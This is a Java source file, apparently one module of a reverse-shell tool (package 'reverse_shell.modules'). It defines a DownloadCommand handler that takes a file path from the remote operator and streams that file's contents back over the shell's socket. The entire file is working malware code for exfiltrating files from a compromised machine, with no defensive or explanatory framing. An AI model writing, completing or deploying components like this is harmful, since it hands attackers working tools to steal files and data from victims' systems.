package reverse_shell.modules;

import reverse_shell.CommandHandler;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.Socket;

public class DownloadCommand implements CommandHandler {
    @Override
    public void handle(String[] args, Socket socket) throws Exception {
        if (args.length == 0) {
            socket.getOutputStream().write("Missing file path\n".getBytes());
            return;
        }

        File file = new File(args[0]);
        if (!file.exists()) {
            socket.getOutputStream().write("File not found\n".getBytes());
            return;
        }

        socket.getOutputStream().write("---BEGIN FILE---\n".getBytes());
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[1024];
        int count;
        while ((count = fis.read(buffer)) > 0) {
            socket.getOutputStream().write(buffer, 0, count);
        }
        fis.close();
        socket.getOutputStream().write("\n---END FILE---\n".getBytes());
    }
}